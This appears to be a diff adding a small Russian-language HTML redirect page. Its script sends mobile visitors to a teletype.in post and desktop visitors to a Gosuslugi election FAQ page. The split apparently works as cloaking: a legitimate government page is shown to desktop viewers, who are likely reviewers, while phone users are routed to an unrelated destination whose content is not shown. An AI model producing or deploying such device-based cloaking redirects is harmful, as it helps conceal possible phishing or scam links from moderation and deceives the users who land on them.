@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Редирект</title>
+    <script>
+        // САМЫЙ ПРОСТОЙ ВАРИАНТ
+        var isMobile = /Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|Mobile/i.test(navigator.userAgent);
+        
+        if (isMobile) {
+            window.location.replace('https://teletype.in/@br.on.wyneh.lenscn/kmhZ8pyTJnq'); // ССЫЛКА ДЛЯ МОБИЛКИ
+        } else {
+            window.location.replace('https://www.gosuslugi.ru/help/faq/singleday_election/158527'); // ССЫЛКА ДЛЯ ПК
+        }
+    </script>
+</head>
+<body>
+    <!-- Если редирект не сработает, покажется это -->
+    <p>...</p>
+</body>
+</html>
